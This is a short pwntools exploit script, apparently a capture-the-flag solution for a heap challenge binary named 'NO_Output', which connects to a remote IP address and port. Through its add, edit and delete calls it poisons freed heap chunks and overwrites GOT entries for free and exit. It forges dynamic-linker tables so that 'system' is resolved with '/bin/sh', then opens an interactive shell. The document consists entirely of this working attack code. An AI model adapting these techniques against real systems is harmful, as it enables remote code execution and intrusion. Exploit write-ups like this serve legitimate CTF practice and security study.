from pwn import *

# p = process('./NO_Output')
p = remote("13.233.166.242",49153)

free_got = 0x404018
exit_got = 0x404058
fake_tables = 0x404190
init = 0x401236
leave = 0x4012a1
plt = 0x401020
delete = 0x4014ba

def add(index,size,data):
	p.sendline("1")
	p.sendline(str(index))
	p.sendline(str(size))
	p.sendline(data)

def edit(index,data):
	p.sendline("2")
	p.sendline(str(index))
	p.sendline(data)

def delete(index):
	p.sendline("3")
	p.sendline(str(index))


p.sendline("manish")

add(0,16,"A")
add(1,16,"B")
add(2,32,"C")
add(3,32,"D")
add(4,48,"E")
add(5,48,"F")

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)

edit(1,p64(exit_got))
edit(3,p64(free_got))
edit(5,p64(fake_tables))

add(0,16,"A")
add(1,16,p64(init))
add(2,32,"C")
add(3,32,p64(plt) + p64(leave))
add(4,48,"/bin/sh")
add(5,48,"system\x00\x00"+p64(0x0)+p64(0x404018)+p64(0x29400000007)+p64(0x3c58))

payload = p64(0x401020)*6 + p64(0x274) + p64(0x4012a2) + p64(0x4014ba)

p.sendline(str(0))
p.send(payload)

p.sendline("4")

p.interactive()
